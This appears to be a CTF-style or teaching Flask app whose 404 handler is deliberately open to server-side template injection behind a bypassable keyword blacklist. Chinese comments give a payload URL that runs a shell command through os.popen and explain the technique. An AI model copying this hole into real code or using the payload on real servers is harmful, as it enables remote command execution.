```
import urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__, static_url_path='')

@app.errorhandler(404)
def page_not_found(e):
    print("url: {}".format(request.path))
    path = urllib.parse.unquote(request.path)
    print(path)
    bans = ["\"", "'", "[", "]", "|", "import",
            "os", "+", "-", "*", "\\", "%", "=", "flag"]
    for i in bans:
        if i in path:
            print("{} in {}".format(i, path))
            return "Hacker！！"
    print(path)
    page = ''' 
    <!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>404 | Page not found!</title>
</head>
<body>
    <p class="error-advise">The PATH (%s) could not be found.</p>
</body>

</html>
    ''' % path
    print(page)
    return render_template_string(page), 404 

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port=10008)
```
# 访问如下网址即可实现SSTI
# http://xxx:10008/{{url_for.__globals__.__getitem__(request.args.a).popen(request.args.b).read()}}?a=os&b=pwd
# os.popen("pwd").read() 是一种执行命令的方法
# render_template_string方法会执行string中的命令，进而实现SSTI(服务端模板注入攻击)